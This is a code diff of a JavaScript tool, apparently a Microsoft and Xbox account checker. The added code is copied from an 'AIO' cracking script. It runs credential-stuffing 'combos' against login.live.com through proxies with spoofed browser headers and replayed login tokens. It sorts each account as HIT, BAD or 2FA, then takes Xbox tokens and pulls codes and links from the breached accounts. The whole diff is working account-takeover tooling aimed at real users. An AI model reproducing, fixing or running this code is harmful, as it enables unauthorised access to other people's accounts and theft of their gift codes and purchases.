@@ -22,158 +22,325 @@ function isInvalidCodeFormat(code) {
   return false;
 }
 
-// ── Cookie-aware fetch (preserves cookies across redirects like Python requests.Session) ──
+// ── AIO-style CookieJar (exact from meowmal-aio.js) ──────────
 
-function extractCookiesFromResponse(res, cookieJar) {
-  const setCookies = res.headers.getSetCookie?.() || [];
-  for (const c of setCookies) {
-    const parts = c.split(";")[0].trim();
-    if (parts.includes("=")) {
-      cookieJar.push(parts);
-    }
+class CookieJar {
+  constructor() {
+    this.cookies = {};
   }
-}
-
-function getCookieString(cookieJar) {
-  return cookieJar.join("; ");
-}
-
-async function sessionFetch(url, options, cookieJar) {
-  // Manual redirect following to preserve cookies (like Python requests.Session)
-  let currentUrl = url;
-  let method = options.method || "GET";
-  let body = options.body;
-  let maxRedirects = 15;
-
-  while (maxRedirects-- > 0) {
-    const res = await proxiedFetch(currentUrl, {
-      ...options,
-      method,
-      body,
-      headers: {
-        ...options.headers,
-        Cookie: getCookieString(cookieJar),
-      },
-      redirect: "manual",
-    });
-
-    extractCookiesFromResponse(res, cookieJar);
-
-    const status = res.status;
-    if (status >= 300 && status < 400) {
-      const location = res.headers.get("location");
-      if (!location) break;
-      currentUrl = new URL(location, currentUrl).href;
-      // Redirects become GET (except 307/308)
-      if (status !== 307 && status !== 308) {
-        method = "GET";
-        body = undefined;
+  ingest(setCookieHeaders) {
+    if (!setCookieHeaders) return;
+    const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
+    for (const h of headers) {
+      const parts = h.split(";")[0].split("=");
+      if (parts.length >= 2) {
+        const name = parts[0].trim();
+        const value = parts.slice(1).join("=").trim();
+        this.cookies[name] = value;
       }
-      // Consume body to avoid memory leaks
-      try { await res.text(); } catch {}
-      continue;
     }
-
-    // Return with the final URL attached
-    const text = await res.text();
-    return { res, text, finalUrl: currentUrl };
   }
-
-  throw new Error("Too many redirects");
-}
-
-// ── Xbox Live OAuth Login ────────────────────────────────────
-
-const MICROSOFT_OAUTH_URL =
-  "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";
-
-async function fetchOAuthTokens(session) {
-  try {
-    const { text } = await sessionFetch(MICROSOFT_OAUTH_URL, {
-      headers: session.headers,
-    }, session.cookies);
-
-    let match = text.match(/value=\\?"(.+?)\\?"/s) || text.match(/value="(.+?)"/s);
-    if (!match) return { urlPost: null, ppft: null };
-    const ppft = match[1];
-
-    match = text.match(/"urlPost":"(.+?)"/s) || text.match(/urlPost:'(.+?)'/s);
-    if (!match) return { urlPost: null, ppft: null };
-
-    return { urlPost: match[1], ppft };
-  } catch {
-    return { urlPost: null, ppft: null };
+  get(name) {
+    return this.cookies[name] || null;
+  }
+  header() {
+    return Object.entries(this.cookies)
+      .map(([k, v]) => `${k}=${v}`)
+      .join("; ");
   }
 }
 
-async function fetchLogin(session, email, password, urlPost, ppft) {
-  try {
-    const body = new URLSearchParams({
-      login: email,
-      loginfmt: email,
-      passwd: password,
-      PPFT: ppft,
-    });
+// ── AIO-style sessionFetch (manual redirects, cookie tracking) ──
 
-    const { text, finalUrl } = await sessionFetch(urlPost, {
-      method: "POST",
-      headers: {
-        ...session.headers,
-        "Content-Type": "application/x-www-form-urlencoded",
-      },
-      body: body.toString(),
-    }, session.cookies);
+async function sessionFetch(url, options, jar, timeoutMs = 15000) {
+  let currentUrl = url;
+  let redirectCount = 0;
+  const MAX_REDIRECTS = 15;
+  let lastText = "";
+  let lastStatus = 0;
 
-    // Check if final URL has access_token in fragment
-    if (finalUrl.includes("#")) {
-      const hash = new URL(finalUrl).hash.substring(1);
-      const params = new URLSearchParams(hash);
-      const token = params.get("access_token");
-      if (token && token !== "None") return token;
+  while (redirectCount < MAX_REDIRECTS) {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), timeoutMs);
+
+    try {
+      const fetchOpts = {
+        ...options,
+        signal: ctrl.signal,
+        redirect: "manual",
+        headers: {
+          ...(options.headers || {}),
+          Cookie: jar.header(),
+        },
+      };
+
+      const res = await proxiedFetch(currentUrl, fetchOpts);
+      lastStatus = res.status;
+
+      // Ingest cookies
+      const setCookie = res.headers.raw ? res.headers.raw()["set-cookie"] : res.headers.getSetCookie?.();
+      if (setCookie) jar.ingest(setCookie);
+
+      if ([301, 302, 303, 307, 308].includes(res.status)) {
+        const loc = res.headers.get("location");
+        if (!loc) break;
+        currentUrl = loc.startsWith("http") ? loc : new URL(loc, currentUrl).href;
+        try { await res.text(); } catch {}
+        redirectCount++;
+        if ([301, 302, 303].includes(res.status)) {
+          options = { ...options, method: "GET", body: undefined };
+          if (options.headers) delete options.headers["Content-Type"];
+        }
+        continue;
+      }
+
+      lastText = await res.text();
+      break;
+    } catch (err) {
+      if (err.name === "AbortError") break;
+      throw err;
+    } finally {
+      clearTimeout(t);
     }
+  }
 
-    if (text.includes("cancel?mkt=")) {
-      const iptMatch = text.match(/(?<="ipt" value=").+?(?=">)/);
-      const ppridMatch = text.match(/(?<="pprid" value=").+?(?=">)/);
-      const uaidMatch = text.match(/(?<="uaid" value=").+?(?=">)/);
-      const actionMatch = text.match(/(?<=id="fmHF" action=").+?(?=" )/);
+  return { text: lastText, finalUrl: currentUrl, status: lastStatus, jar };
+}
 
-      if (iptMatch && ppridMatch && uaidMatch && actionMatch) {
-        const formBody = new URLSearchParams({
-          ipt: iptMatch[0],
-          pprid: ppridMatch[0],
-          uaid: uaidMatch[0],
-        });
+// ── Regex patterns (exact from meowmal-aio.js) ──────────────
 
-        const { text: retText } = await sessionFetch(actionMatch[0], {
-          method: "POST",
-          headers: {
-            ...session.headers,
-            "Content-Type": "application/x-www-form-urlencoded",
-          },
-          body: formBody.toString(),
-        }, session.cookies);
+const RE_SFTTAG_VALUE = /value=\\"(.+?)\\"|value="(.+?)"|sFTTag:'(.+?)'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"/s;
+const RE_URLPOST_VALUE = /"urlPost":"(.+?)"|urlPost:'(.+?)'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"/s;
+const RE_IPT = /(?<="ipt" value=").+?(?=">)/;
+const RE_PPRID = /(?<="pprid" value=").+?(?=">)/;
+const RE_UAID = /(?<="uaid" value=").+?(?=">)/;
+const RE_ACTION_FMHF = /(?<=id="fmHF" action=").+?(?=" )/;
+const RE_RETURN_URL = /(?<="recoveryCancel":\{"returnUrl":").+?(?=",)/;
 
-        const returnUrlMatch = retText.match(
-          /(?<="recoveryCancel":\{"returnUrl":")(.+?)(?=",)/
-        );
-        if (returnUrlMatch) {
-          const { finalUrl: finUrl } = await sessionFetch(returnUrlMatch[0], {
-            headers: session.headers,
-          }, session.cookies);
-          if (finUrl.includes("#")) {
-            const hash = new URL(finUrl).hash.substring(1);
-            const params = new URLSearchParams(hash);
-            const token = params.get("access_token");
-            if (token && token !== "None") return token;
+const sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";
+
+const MAX_RETRIES = 3;
+
+// ── preCheckCombo (exact from meowmal-aio.js) ────────────────
+
+async function preCheckCombo(email, password) {
+  const url = "https://login.live.com/ppsecure/post.srf";
+  const params = new URLSearchParams({
+    nopa: "2",
+    client_id: "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
+    cobrandid: "8058f65d-ce06-4c30-9559-473c9275a65d",
+    contextid: "F3FB0F6AB3D6991E",
+    opid: "5F188DEDF4A1266A",
+    bk: "1768757278",
+    uaid: "b1d1e6fbf8b24f9b8a73b347b178d580",
+    pid: "15216",
+  });
+
+  const payload = new URLSearchParams({
+    ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
+    canary: "", ctx: "", hpgrequestid: "",
+    PPFT: "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
+    PPSX: "P", NewUser: "1", FoundMSAs: "", fspost: "0", i21: "0",
+    CookieDisclosure: "0", IsFidoSupported: "1", isSignupPost: "0",
+    isRecoveryAttemptPost: "0", i13: "0", login: email, loginfmt: email,
+    type: "11", LoginOptions: "3", lrt: "", lrtPartition: "",
+    hisRegion: "", hisScaleUnit: "", cpr: "0", passwd: password,
+  });
+
+  const headers = {
+    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Accept-Encoding": "gzip, deflate, br, zstd",
+    "Cache-Control": "max-age=0",
+    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+    "sec-ch-ua-mobile": "?1",
+    "sec-ch-ua-platform": '"Android"',
+    "sec-ch-ua-platform-version": '"12.0.0"',
+    Origin: "https://login.live.com",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-User": "?1",
+    "Sec-Fetch-Dest": "document",
+    Referer: "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx",
+    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,ku;q=0.7,ro;q=0.6",
+  };
+
+  let currentTry = 0;
+  while (currentTry <= Math.min(2, MAX_RETRIES)) {
+    try {
+      const res = await proxiedFetch(`${url}?${params}`, {
+        method: "POST",
+        headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
+        body: payload.toString(),
+        redirect: "follow",
+      });
+
+      const statusCode = res.status;
+      const responseText = (await res.text()).toLowerCase();
+
+      if (statusCode >= 500 || statusCode === 429) {
+        currentTry++;
+        await new Promise(r => setTimeout(r, 1500));
+        continue;
+      }
+
+      const twoFaIndicators = [
+        "suggestedaction", "sign in to continue", "enter code", "two-step",
+        "two. step", "two factor", "2fa", "second verification", "verification code",
+        "authenticator", "texted you", "sent a code", "enter the code",
+        "additional security", "extra security",
+      ];
+      if (twoFaIndicators.some((ind) => responseText.includes(ind))) return "2FA";
+
+      const successIndicators = [
+        "to do that, sign in", "welcome", "redirecting", "location.href",
+        "home.live.com", "account.microsoft.com", "myaccount.microsoft.com",
+        "profile.microsoft.com", "https://account.live.com/", "microsoft account home",
+        "signed in successfully", "you're signed in",
+      ];
+      if (successIndicators.some((ind) => responseText.includes(ind))) return "HIT";
+
+      const failureIndicators = [
+        "invalid username or password", "that microsoft account doesn't exist",
+        "incorrect password", "your account or password is incorrect",
+        "sorry, that password isn't right", "entered is incorrect",
+        "account doesn't exist", "no account found", "wrong password",
+        "incorrect credentials", "login failed", "sign in unsuccessful",
+        "we couldn't find an account", "please check your credentials",
+        "sign-in was blocked", "account is locked", "suspended",
+        "temporarily locked", "security challenge", "unusual activity",
+        "verify your identity", "account review", "safety concerns",
+      ];
+      if (failureIndicators.some((ind) => responseText.includes(ind))) return "BAD";
+
+      return "UNKNOWN";
+    } catch {
+      currentTry++;
+      await new Promise(r => setTimeout(r, 1500));
+    }
+  }
+  return "ERROR";
+}
+
+// ── getUrlPostSFTTag (exact from meowmal-aio.js) ────────────
+
+async function getUrlPostSFTTag(jar) {
+  let attempts = 0;
+  while (attempts < MAX_RETRIES) {
+    try {
+      const headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        Connection: "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+      };
+
+      const { text } = await sessionFetch(sFTTag_url, { method: "GET", headers }, jar, 15000);
+
+      const match = RE_SFTTAG_VALUE.exec(text);
+      if (match) {
+        const sFTTag = match[1] || match[2] || match[3] || match[4] || match[5];
+        if (sFTTag) {
+          const matchUrl = RE_URLPOST_VALUE.exec(text);
+          if (matchUrl) {
+            let urlPost = matchUrl[1] || matchUrl[2] || matchUrl[3] || matchUrl[4];
+            if (urlPost) {
+              urlPost = urlPost.replace(/&amp;/g, "&");
+              return { urlPost, sFTTag };
+            }
           }
         }
       }
-    }
-    return null;
-  } catch {
-    return null;
+    } catch {}
+
+    attempts++;
+    await new Promise(r => setTimeout(r, 100));
   }
+  return { urlPost: null, sFTTag: null };
+}
+
+// ── getXboxRps (exact from meowmal-aio.js) ───────────────────
+
+async function getXboxRps(jar, email, password, urlPost, sFTTag) {
+  let tries = 0;
+  while (tries < MAX_RETRIES) {
+    try {
+      const data = new URLSearchParams({
+        login: email, loginfmt: email, passwd: password, PPFT: sFTTag,
+      });
+      const headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        Connection: "close",
+      };
+
+      const { text: responseText, finalUrl } = await sessionFetch(urlPost, {
+        method: "POST",
+        headers,
+        body: data.toString(),
+      }, jar, 15000);
+
+      if (finalUrl.includes("#") && finalUrl !== sFTTag_url) {
+        const parsed = new URL(finalUrl);
+        const fragment = parsed.hash.slice(1);
+        const params = new URLSearchParams(fragment);
+        const token = params.get("access_token");
+        if (token && token !== "None") return token;
+      }
+
+      if (responseText.includes("cancel?mkt=")) {
+        try {
+          const iptMatch = RE_IPT.exec(responseText);
+          const ppridMatch = RE_PPRID.exec(responseText);
+          const uaidMatch = RE_UAID.exec(responseText);
+          const actionMatch = RE_ACTION_FMHF.exec(responseText);
+
+          if (iptMatch && ppridMatch && uaidMatch && actionMatch) {
+            const formData = new URLSearchParams({
+              ipt: iptMatch[0], pprid: ppridMatch[0], uaid: uaidMatch[0],
+            });
+            const { text: retText } = await sessionFetch(actionMatch[0], {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: formData.toString(),
+            }, jar, 15000);
+
+            const returnUrlMatch = RE_RETURN_URL.exec(retText);
+            if (returnUrlMatch) {
+              const { finalUrl: finUrl } = await sessionFetch(returnUrlMatch[0], { method: "GET" }, jar, 15000);
+              const parsed2 = new URL(finUrl);
+              const fragment2 = parsed2.hash.slice(1);
+              const params2 = new URLSearchParams(fragment2);
+              const token2 = params2.get("access_token");
+              if (token2 && token2 !== "None") return token2;
+            }
+          }
+        } catch {}
+      }
+
+      if (["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="].some((v) => responseText.includes(v))) {
+        return "2FA";
+      }
+
+      const badIndicators = ["password is incorrect", "account doesn't exist", "that microsoft account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password", "help us protect your account"];
+      if (badIndicators.some((v) => responseText.toLowerCase().includes(v))) {
+        return "None";
+      }
+
+      tries++;
+      await new Promise(r => setTimeout(r, 100));
+    } catch {
+      tries++;
+      await new Promise(r => setTimeout(r, 100));
+    }
+  }
+  return "None";
 }
 
 async function getXboxTokens(rpsToken) {
@@ -593,20 +760,24 @@ async function validateCodePrepareRedeem(code, token, storeState, cookieJar, use
 // ── Main Pull Pipeline ───────────────────────────────────────
 
 async function fetchFromAccount(email, password) {
-  const session = {
-    headers: {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    },
-    cookies: [], // Array-based cookie jar for proper tracking
-  };
-
   try {
-    const { urlPost, ppft } = await fetchOAuthTokens(session);
-    if (!urlPost) return { email, codes: [], links: [], error: "OAuth failed" };
+    // ── Phase 0: Pre-check (exact AIO logic) ──
+    const bypass = await preCheckCombo(email, password);
+    if (bypass === "BAD") return { email, codes: [], links: [], error: "Invalid credentials" };
+    if (bypass === "2FA") return { email, codes: [], links: [], error: "2FA" };
+    if (bypass === "ERROR") return { email, codes: [], links: [], error: "Pre-check failed" };
 
-    const rps = await fetchLogin(session, email, password, urlPost, ppft);
-    if (!rps) return { email, codes: [], links: [], error: "Login failed" };
+    // ── Phase 1: Dynamic PPFT login (exact AIO logic) ──
+    const jar = new CookieJar();
 
+    const { urlPost, sFTTag } = await getUrlPostSFTTag(jar);
+    if (!urlPost || !sFTTag) return { email, codes: [], links: [], error: "OAuth failed" };
+
+    const rps = await getXboxRps(jar, email, password, urlPost, sFTTag);
+    if (rps === "2FA") return { email, codes: [], links: [], error: "2FA" };
+    if (rps === "None" || !rps) return { email, codes: [], links: [], error: "Login failed" };
+
+    // ── Phase 2: Xbox tokens (same as before) ──
     const { uhs, xstsToken } = await getXboxTokens(rps);
     if (!uhs) return { email, codes: [], links: [], error: "Xbox tokens failed" };
 
